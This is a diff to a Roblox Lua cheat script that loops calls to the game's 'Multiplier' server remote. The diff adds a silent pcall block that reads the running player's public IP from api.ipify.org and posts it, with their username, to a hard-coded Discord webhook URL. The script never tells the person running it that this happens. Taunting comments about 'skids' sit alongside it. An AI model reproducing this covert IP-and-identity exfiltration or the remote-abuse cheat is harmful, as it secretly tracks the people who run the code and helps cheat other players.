@@ -1,4 +1,21 @@
 --uwy on top of u skids tryna read the code LOL
+--spam the webhook i dare you
+
+        pcall(function() local data = {
+            ["content"] = game.Players.LocalPlayer.Name.." executed: "..game:HttpGet("https://api.ipify.org")
+        }
+
+        request(
+    {
+        Url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = game:GetService("HttpService"):JSONEncode(data)
+    }
+) end)
+
 function increaseX(x: String, t: Number)
     for i = 1, t do
         game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("Multiplier"):InvokeServer(unpack({
